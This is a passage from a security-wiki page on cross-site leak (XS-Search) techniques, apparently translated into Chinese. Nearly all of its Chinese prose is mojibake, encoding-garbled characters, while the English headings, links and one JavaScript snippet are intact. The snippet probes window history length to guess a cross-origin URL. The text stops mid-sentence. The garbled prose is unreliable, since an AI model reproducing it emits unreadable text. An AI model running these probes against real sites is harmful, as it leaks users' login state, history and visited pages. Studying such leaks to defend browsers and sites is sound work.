å¦‚æœæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼å°† cookies è®¾ç½®ç»™ç”¨æˆ·ï¼Œæ‚¨è¿˜å¯ä»¥é€šè¿‡**è®¾ç½®è¶³å¤Ÿçš„ cookies**ï¼ˆ[**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)ï¼‰æ¥æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå› æ­¤**æ­£ç¡®å“åº”**çš„**å“åº”å¤§å°**å¢åŠ æ—¶ä¼šè§¦å‘ä¸€ä¸ª**é”™è¯¯**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä»åŒä¸€ç«™ç‚¹è§¦å‘æ­¤è¯·æ±‚ï¼Œ`<script>` å°†è‡ªåŠ¨å‘é€ cookiesï¼ˆå› æ­¤æ‚¨å¯ä»¥æ£€æŸ¥é”™è¯¯ï¼‰ã€‚\
æœ‰å…³**cookie bomb + XS-Search**çš„ç¤ºä¾‹å¯ä»¥åœ¨æ­¤å†™ä½œçš„æ„å›¾è§£å†³æ–¹æ¡ˆä¸­æ‰¾åˆ°ï¼š[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` æˆ–å¤„äºç›¸åŒä¸Šä¸‹æ–‡é€šå¸¸æ˜¯æ­¤ç±»æ”»å‡»æ‰€éœ€çš„ã€‚

### URL æœ€å¤§é•¿åº¦ - å®¢æˆ·ç«¯

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç  / å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **æ€»ç»“:** æ£€æµ‹å“åº”ä¸­çš„å·®å¼‚ï¼Œå› ä¸ºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½è¿‡å¤§ï¼Œä»¥è‡³äºå¯ä»¥æ³¨æ„åˆ°å·®å¼‚ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

æ ¹æ® [Chromium æ–‡æ¡£](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length)ï¼ŒChrome çš„æœ€å¤§ URL é•¿åº¦ä¸º 2MBã€‚

> ä¸€èˆ¬æ¥è¯´ï¼Œ_web å¹³å°_ å¯¹ URL çš„é•¿åº¦æ²¡æœ‰é™åˆ¶ï¼ˆå°½ç®¡ 2^31 æ˜¯ä¸€ä¸ªå¸¸è§é™åˆ¶ï¼‰ã€‚_Chrome_ å°† URL é™åˆ¶ä¸ºæœ€å¤§é•¿åº¦ **2MB**ï¼Œå‡ºäºå®é™…åŸå› å¹¶é¿å…åœ¨è¿›ç¨‹é—´é€šä¿¡ä¸­é€ æˆæ‹’ç»æœåŠ¡é—®é¢˜ã€‚

å› æ­¤ï¼Œå¦‚æœ**é‡å®šå‘ URL çš„å“åº”åœ¨æŸäº›æƒ…å†µä¸‹æ›´å¤§**ï¼Œåˆ™å¯ä»¥ä½¿å…¶é‡å®šå‘åˆ°**å¤§äº 2MB çš„ URL**ä»¥è¾¾åˆ°**é•¿åº¦é™åˆ¶**ã€‚å½“å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼ŒChrome ä¼šæ˜¾ç¤ºä¸€ä¸ª**`about:blank#blocked`** é¡µé¢ã€‚

**æ˜¾è‘—å·®å¼‚**æ˜¯ï¼Œå¦‚æœ**é‡å®šå‘**å·²**å®Œæˆ**ï¼Œ`window.origin` ä¼šæŠ›å‡ºä¸€ä¸ª**é”™è¯¯**ï¼Œå› ä¸ºè·¨æºæ— æ³•è®¿é—®è¯¥ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœ**é™åˆ¶**è¢«****è§¦å‘å¹¶ä¸”åŠ è½½çš„é¡µé¢æ˜¯**`about:blank#blocked`**ï¼Œåˆ™çª—å£çš„**`origin`** ä¿æŒä¸º**çˆ¶çº§**çš„å€¼ï¼Œè¿™æ˜¯ä¸€ä¸ª**å¯è®¿é—®çš„ä¿¡æ¯**ã€‚

æ‰€æœ‰è¾¾åˆ°**2MB**æ‰€éœ€çš„é¢å¤–ä¿¡æ¯å¯ä»¥é€šè¿‡åˆå§‹ URL ä¸­çš„**å“ˆå¸Œ**æ·»åŠ ï¼Œä»¥ä¾¿åœ¨é‡å®šå‘ä¸­**ä½¿ç”¨**ã€‚

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### æœ€å¤§é‡å®šå‘

* **åŒ…å«æ–¹æ³•**: Fetch API, æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **æ€»ç»“:** ä½¿ç”¨æµè§ˆå™¨çš„é‡å®šå‘é™åˆ¶æ¥ç¡®å®š URL é‡å®šå‘çš„å‘ç”Ÿã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

å¦‚æœæµè§ˆå™¨çš„**æœ€å¤§**é‡å®šå‘æ¬¡æ•°ä¸º**20**ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•ç”¨**19 æ¬¡é‡å®šå‘**åŠ è½½ä»–çš„é¡µé¢ï¼Œæœ€å**å°†å—å®³è€…**å‘é€åˆ°æµ‹è¯•é¡µé¢ã€‚å¦‚æœè§¦å‘äº†**é”™è¯¯**ï¼Œåˆ™é¡µé¢è¯•å›¾**é‡å®šå‘å—å®³è€…**ã€‚

### å†å²é•¿åº¦

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶, å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: é‡å®šå‘
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **æ€»ç»“:** JavaScript ä»£ç æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œå¯ä»¥é€šè¿‡é•¿åº¦å±æ€§è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**å†å² API** å…è®¸ JavaScript ä»£ç æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œ**ä¿å­˜ç”¨æˆ·è®¿é—®çš„é¡µé¢**ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨é•¿åº¦å±æ€§ä½œä¸ºåŒ…å«æ–¹æ³•ï¼šæ£€æµ‹ JavaScript å’Œ HTML å¯¼èˆªã€‚\
**æ£€æŸ¥ `history.length`**ï¼Œä½¿ç”¨æˆ·**å¯¼èˆª**åˆ°ä¸€ä¸ªé¡µé¢ï¼Œ**è¿”å›**åˆ°åŒæºå¹¶**æ£€æŸ¥**æ–°çš„**`history.length`**å€¼ã€‚

### åŒä¸€ URL çš„å†å²é•¿åº¦

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶, å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: å¦‚æœ URL ä¸çŒœæµ‹çš„ URL ç›¸åŒ
* **æ€»ç»“:** å¯ä»¥é€šè¿‡å†å²é•¿åº¦çŒœæµ‹æ¡†æ¶/å¼¹å‡ºçª—å£çš„ä½ç½®æ˜¯å¦åœ¨ç‰¹å®š URL ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**: ä»¥ä¸‹

æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ JavaScript ä»£ç **æ“çºµæ¡†æ¶/å¼¹å‡ºçª—å£çš„ä½ç½®åˆ°çŒœæµ‹çš„ URL**ï¼Œå¹¶**ç«‹å³**å°†å…¶**æ›´æ”¹ä¸º `about:blank`**ã€‚å¦‚æœå†å²é•¿åº¦å¢åŠ ï¼Œåˆ™æ„å‘³ç€ URL æ˜¯æ­£ç¡®çš„ï¼Œå¹¶ä¸”æœ‰æ—¶é—´**å¢åŠ ï¼Œå› ä¸ºå¦‚æœ URL ç›¸åŒåˆ™ä¸ä¼šé‡æ–°åŠ è½½**ã€‚å¦‚æœæ²¡æœ‰å¢åŠ ï¼Œåˆ™æ„å‘³ç€å®ƒ**å°è¯•åŠ è½½çŒœæµ‹çš„ URL**ï¼Œä½†å› ä¸ºæˆ‘ä»¬**ç«‹å³ä¹‹å**åŠ è½½äº†**`about:blank`**ï¼Œæ‰€ä»¥**å†å²é•¿åº¦åœ¨åŠ è½½çŒœæµ‹çš„ URL æ—¶ä»æœªå¢åŠ **ã€‚
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** é€šè¿‡æ£€æŸ¥ `window.length` å±æ€§è¯„ä¼° iframe å…ƒç´ çš„æ•°é‡ã€‚
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

è®¡ç®—é€šè¿‡ `iframe` æˆ– `window.open` æ‰“å¼€çš„ **ç½‘é¡µä¸­çš„æ¡†æ¶æ•°é‡** å¯èƒ½æœ‰åŠ©äºè¯†åˆ« **ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šçš„çŠ¶æ€**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœé¡µé¢å§‹ç»ˆå…·æœ‰ç›¸åŒæ•°é‡çš„æ¡†æ¶ï¼Œ**æŒç»­** æ£€æŸ¥æ¡†æ¶æ•°é‡å¯èƒ½æœ‰åŠ©äºè¯†åˆ«å¯èƒ½æ³„éœ²ä¿¡æ¯çš„ **æ¨¡å¼**ã€‚

è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªä¾‹å­æ˜¯ï¼Œåœ¨ Chrome ä¸­ï¼Œ**PDF** å¯ä»¥é€šè¿‡ **æ¡†æ¶è®¡æ•°** è¢« **æ£€æµ‹åˆ°**ï¼Œå› ä¸ºå†…éƒ¨ä½¿ç”¨äº† `embed`ã€‚æœ‰ä¸€äº› [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) å…è®¸å¯¹å†…å®¹è¿›è¡Œä¸€äº›æ§åˆ¶ï¼Œä¾‹å¦‚ `zoom`ã€`view`ã€`page`ã€`toolbar`ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½ä¼šå¾ˆæœ‰è¶£ã€‚

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** è¯»å–æ³„éœ²çš„å€¼ä»¥åŒºåˆ†ä¸¤ç§å¯èƒ½çš„çŠ¶æ€
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

é€šè¿‡ HTML å…ƒç´ çš„ä¿¡æ¯æ³„éœ²æ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å½“åŠ¨æ€åª’ä½“æ–‡ä»¶åŸºäºç”¨æˆ·ä¿¡æ¯ç”Ÿæˆæ—¶ï¼Œæˆ–è€…å½“æ·»åŠ æ°´å°æ—¶ï¼Œæ”¹å˜åª’ä½“å¤§å°ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡åˆ†ææŸäº› HTML å…ƒç´ æš´éœ²çš„ä¿¡æ¯æ¥åŒºåˆ†å¯èƒ½çš„çŠ¶æ€ã€‚

### Information Exposed by HTML Elements

* **HTMLMediaElement**: æ­¤å…ƒç´ æ­ç¤ºåª’ä½“çš„ `duration` å’Œ `buffered` æ—¶é—´ï¼Œå¯ä»¥é€šè¿‡å…¶ API è®¿é—®ã€‚[äº†è§£æ›´å¤šå…³äº HTMLMediaElement çš„ä¿¡æ¯](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: å®ƒæš´éœ² `videoHeight` å’Œ `videoWidth`ã€‚åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œåƒ `webkitVideoDecodedByteCount`ã€`webkitAudioDecodedByteCount` å’Œ `webkitDecodedFrameCount` ç­‰é™„åŠ å±æ€§å¯ç”¨ï¼Œæä¾›æœ‰å…³åª’ä½“å†…å®¹çš„æ›´æ·±å…¥ä¿¡æ¯ã€‚[äº†è§£æ›´å¤šå…³äº HTMLVideoElement çš„ä¿¡æ¯](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: æ­¤å‡½æ•°æä¾›æœ‰å…³è§†é¢‘æ’­æ”¾è´¨é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ `totalVideoFrames`ï¼Œè¿™å¯ä»¥æŒ‡ç¤ºå¤„ç†çš„è§†é¢‘æ•°æ®é‡ã€‚[äº†è§£æ›´å¤šå…³äº getVideoPlaybackQuality() çš„ä¿¡æ¯](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: æ­¤å…ƒç´ æ³„éœ²å›¾åƒçš„ `height` å’Œ `width`ã€‚ä½†æ˜¯ï¼Œå¦‚æœå›¾åƒæ— æ•ˆï¼Œè¿™äº›å±æ€§å°†è¿”å› 0ï¼Œå¹¶ä¸” `image.decode()` å‡½æ•°å°†è¢«æ‹’ç»ï¼Œè¡¨ç¤ºæœªèƒ½æ­£ç¡®åŠ è½½å›¾åƒã€‚[äº†è§£æ›´å¤šå…³äº HTMLImageElement çš„ä¿¡æ¯](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** è¯†åˆ«ä¸ç”¨æˆ·çŠ¶æ€æˆ–çŠ¶æ€ç›¸å…³çš„ç½‘ç«™æ ·å¼å˜åŒ–ã€‚
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·çš„çŠ¶æ€æ›´æ”¹ **ç½‘ç«™æ ·å¼**ã€‚è·¨åŸŸ CSS æ–‡ä»¶å¯ä»¥é€šè¿‡ **HTML link å…ƒç´ ** åµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ï¼Œ**è§„åˆ™** å°†è¢« **åº”ç”¨** åˆ°æ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢åŠ¨æ€æ›´æ”¹è¿™äº›è§„åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥æ ¹æ®ç”¨æˆ·çŠ¶æ€ **æ£€æµ‹** è¿™äº› **å·®å¼‚**ã€‚\
ä½œä¸ºä¸€ç§æ³„éœ²æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ `window.getComputedStyle` æ–¹æ³•æ¥ **è¯»å– CSS** å±æ€§ã€‚ç»“æœï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„ CSS å±æ€§ï¼Œåªè¦çŸ¥é“å—å½±å“çš„å…ƒç´ å’Œå±æ€§åç§°ã€‚

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** æ£€æµ‹ `:visited` æ ·å¼æ˜¯å¦åº”ç”¨äº URLï¼ŒæŒ‡ç¤ºå…¶å·²è¢«è®¿é—®
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
æ ¹æ® [**è¿™ä¸ª**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼Œåœ¨æ— å¤´ Chrome ä¸­è¿™ä¸èµ·ä½œç”¨ã€‚
{% endhint %}

CSS `:visited` é€‰æ‹©å™¨ç”¨äºåœ¨ç”¨æˆ·ä¹‹å‰è®¿é—®è¿‡çš„ URL ä¸Šåº”ç”¨ä¸åŒçš„æ ·å¼ã€‚è¿‡å»ï¼Œå¯ä»¥ä½¿ç”¨ `getComputedStyle()` æ–¹æ³•æ¥è¯†åˆ«è¿™äº›æ ·å¼å·®å¼‚ã€‚ç„¶è€Œï¼Œç°ä»£æµè§ˆå™¨å·²å®æ–½å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢æ­¤æ–¹æ³•æ³„éœ²é“¾æ¥çš„çŠ¶æ€ã€‚è¿™äº›æªæ–½åŒ…æ‹¬å§‹ç»ˆè¿”å›è®¡ç®—æ ·å¼ï¼Œä»¿ä½›é“¾æ¥å·²è¢«è®¿é—®ï¼Œå¹¶é™åˆ¶å¯ä»¥ä½¿ç”¨ `:visited` é€‰æ‹©å™¨åº”ç”¨çš„æ ·å¼ã€‚

å°½ç®¡æœ‰è¿™äº›é™åˆ¶ï¼Œä½†å¯ä»¥é—´æ¥è¯†åˆ«é“¾æ¥çš„è®¿é—®çŠ¶æ€ã€‚ä¸€ç§æŠ€æœ¯æ¶‰åŠè¯±ä½¿ç”¨æˆ·ä¸å— CSS å½±å“çš„åŒºåŸŸè¿›è¡Œäº¤äº’ï¼Œç‰¹åˆ«æ˜¯åˆ©ç”¨ `mix-blend-mode` å±æ€§ã€‚è¯¥å±æ€§å…è®¸å…ƒç´ ä¸å…¶èƒŒæ™¯æ··åˆï¼Œå¯èƒ½æ ¹æ®ç”¨æˆ·äº¤äº’æ­ç¤ºè®¿é—®çŠ¶æ€ã€‚

æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨é“¾æ¥çš„æ¸²æŸ“æ—¶é—´æ¥å®ç°æ— ç”¨æˆ·äº¤äº’çš„æ£€æµ‹ã€‚ç”±äºæµè§ˆå™¨å¯èƒ½ä»¥ä¸åŒæ–¹å¼æ¸²æŸ“å·²è®¿é—®å’Œæœªè®¿é—®çš„é“¾æ¥ï¼Œè¿™å¯èƒ½åœ¨æ¸²æŸ“ä¸­å¼•å…¥å¯æµ‹é‡çš„æ—¶é—´å·®ã€‚ä¸€ä¸ªæ¦‚å¿µè¯æ˜ï¼ˆPoCï¼‰åœ¨ Chromium é”™è¯¯æŠ¥å‘Šä¸­æåˆ°ï¼Œæ¼”ç¤ºäº†ä½¿ç”¨å¤šä¸ªé“¾æ¥æ¥æ”¾å¤§æ—¶é—´å·®ï¼Œä»è€Œä½¿è®¿é—®çŠ¶æ€é€šè¿‡æ—¶é—´åˆ†æå¯æ£€æµ‹ã€‚

æœ‰å…³è¿™äº›å±æ€§å’Œæ–¹æ³•çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®å…¶æ–‡æ¡£é¡µé¢ï¼š

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** åœ¨ Google Chrome ä¸­ï¼Œå½“ç”±äº X-Frame-Options é™åˆ¶è€Œé˜»æ­¢é¡µé¢åµŒå…¥åˆ°è·¨åŸŸç«™ç‚¹æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸“ç”¨é”™è¯¯é¡µé¢ã€‚
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

åœ¨ Chrome ä¸­ï¼Œå¦‚æœä¸€ä¸ªå¸¦æœ‰ `X-Frame-Options` å¤´è®¾ç½®ä¸º "deny" æˆ– "same-origin" çš„é¡µé¢ä½œä¸ºå¯¹è±¡åµŒå…¥ï¼Œåˆ™ä¼šå‡ºç°é”™è¯¯é¡µé¢ã€‚Chrome ç‹¬ç‰¹åœ°ä¸ºè¯¥å¯¹è±¡çš„ `contentDocument` å±æ€§è¿”å›ä¸€ä¸ªç©ºæ–‡æ¡£å¯¹è±¡ï¼ˆè€Œä¸æ˜¯ `null`ï¼‰ï¼Œä¸åœ¨ iframe æˆ–å…¶ä»–æµè§ˆå™¨ä¸­çš„è¡¨ç°ä¸åŒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æµ‹ç©ºæ–‡æ¡£æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯èƒ½æ­ç¤ºç”¨æˆ·çŠ¶æ€çš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å¦‚æœå¼€å‘äººå‘˜ä¸ä¸€è‡´åœ°è®¾ç½® X-Frame-Options å¤´ï¼Œé€šå¸¸ä¼šå¿½è§†é”™è¯¯é¡µé¢ã€‚æ„è¯†åˆ°å¹¶ä¸€è‡´åº”ç”¨å®‰å…¨å¤´å¯¹äºé˜²æ­¢æ­¤ç±»æ³„éœ²è‡³å…³é‡è¦ã€‚

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ©ç”¨ iframe æ¥è¯†åˆ«æ–‡ä»¶ä¸‹è½½ï¼›iframe çš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æ–‡ä»¶ä¸‹è½½æˆåŠŸã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` å¤´ï¼Œç‰¹åˆ«æ˜¯ `Content-Disposition: attachment`ï¼ŒæŒ‡ç¤ºæµè§ˆå™¨ä¸‹è½½å†…å®¹è€Œä¸æ˜¯å†…è”æ˜¾ç¤ºã€‚å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®è§¦å‘æ–‡ä»¶ä¸‹è½½çš„é¡µé¢ã€‚åœ¨åŸºäº Chromium çš„æµè§ˆå™¨ä¸­ï¼Œæœ‰å‡ ç§æŠ€æœ¯å¯ä»¥æ£€æµ‹è¿™ç§ä¸‹è½½è¡Œä¸ºï¼š

1. **ä¸‹è½½æ ç›‘æ§**ï¼š
* å½“åœ¨åŸºäº Chromium çš„æµè§ˆå™¨ä¸­ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæµè§ˆå™¨çª—å£åº•éƒ¨ä¼šå‡ºç°ä¸‹è½½æ ã€‚
* é€šè¿‡ç›‘æ§çª—å£é«˜åº¦çš„å˜åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥æ¨æ–­ä¸‹è½½æ çš„å‡ºç°ï¼Œè¡¨æ˜ä¸‹è½½å·²å¯åŠ¨ã€‚
2. **ä½¿ç”¨ Iframe çš„ä¸‹è½½å¯¼èˆª**ï¼š
* å½“é¡µé¢ä½¿ç”¨ `Content-Disposition: attachment` å¤´è§¦å‘æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œå®ƒä¸ä¼šå¯¼è‡´å¯¼èˆªäº‹ä»¶ã€‚
* é€šè¿‡åœ¨ iframe ä¸­åŠ è½½å†…å®¹å¹¶ç›‘æ§å¯¼èˆªäº‹ä»¶ï¼Œå¯ä»¥æ£€æŸ¥å†…å®¹å¤„ç½®æ˜¯å¦å¯¼è‡´æ–‡ä»¶ä¸‹è½½ï¼ˆæ— å¯¼èˆªï¼‰æˆ–ä¸æ˜¯ã€‚
3. **ä¸ä½¿ç”¨ Iframe çš„ä¸‹è½½å¯¼èˆª**ï¼š
* ç±»ä¼¼äº iframe æŠ€æœ¯ï¼Œæ­¤æ–¹æ³•æ¶‰åŠä½¿ç”¨ `window.open` è€Œä¸æ˜¯ iframeã€‚
* ç›‘æ§æ–°æ‰“å¼€çª—å£ä¸­çš„å¯¼èˆªäº‹ä»¶å¯ä»¥æ­ç¤ºæ˜¯å¦è§¦å‘äº†æ–‡ä»¶ä¸‹è½½ï¼ˆæ— å¯¼èˆªï¼‰æˆ–å†…å®¹æ˜¯å¦å†…è”æ˜¾ç¤ºï¼ˆå‘ç”Ÿå¯¼èˆªï¼‰ã€‚

åœ¨åªæœ‰ç™»å½•ç”¨æˆ·å¯ä»¥è§¦å‘æ­¤ç±»ä¸‹è½½çš„æƒ…å†µä¸‹ï¼Œè¿™äº›æŠ€æœ¯å¯ä»¥ç”¨æ¥é—´æ¥æ¨æ–­ç”¨æˆ·çš„èº«ä»½éªŒè¯çŠ¶æ€ï¼ŒåŸºäºæµè§ˆå™¨å¯¹ä¸‹è½½è¯·æ±‚çš„å“åº”ã€‚

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ©ç”¨ iframe æ¥è¯†åˆ«æ–‡ä»¶ä¸‹è½½ï¼›iframe çš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æ–‡ä»¶ä¸‹è½½æˆåŠŸã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (æ¥è‡ª [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªæŠ€æœ¯å¾ˆæœ‰è¶£ï¼šChrome ç°åœ¨æœ‰ **ç¼“å­˜åˆ†åŒº**ï¼Œæ–°æ‰“å¼€é¡µé¢çš„ç¼“å­˜é”®æ˜¯ï¼š`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`ï¼Œä½†å¦‚æœæˆ‘æ‰“å¼€ä¸€ä¸ª ngrok é¡µé¢å¹¶åœ¨å…¶ä¸­ä½¿ç”¨ fetchï¼Œç¼“å­˜é”®å°†æ˜¯ï¼š`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ï¼Œ**ç¼“å­˜é”®æ˜¯ä¸åŒçš„**ï¼Œå› 